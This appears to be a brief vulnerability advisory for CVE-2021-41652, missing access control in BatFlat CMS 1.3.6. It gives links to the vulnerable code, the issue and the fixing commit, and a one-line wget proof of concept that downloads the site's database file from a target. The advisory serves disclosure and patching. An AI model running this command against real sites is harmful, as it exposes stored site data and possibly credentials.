# CVE-2021-41652

**Description:** Missing Access Control in BatFlat CMS 1.3.6

**Vulnerable App:** [Download](https://github.com/sruupl/batflat/archive/master.zip) (reset to commit `0c9511fb342fbdd17fd0d1d0cccafc8ae43b6189`)

**Github Issue:** [https://github.com/sruupl/batflat/issues/113](https://github.com/sruupl/batflat/issues/113)

**Fixed Commit:** [9211d84406d63c575b079619137aff74b67cd344](https://github.com/sruupl/batflat/commit/9211d84406d63c575b079619137aff74b67cd344)

**Proof Of Concept:** `wget https://<target-ip>/inc/data/database.sdb`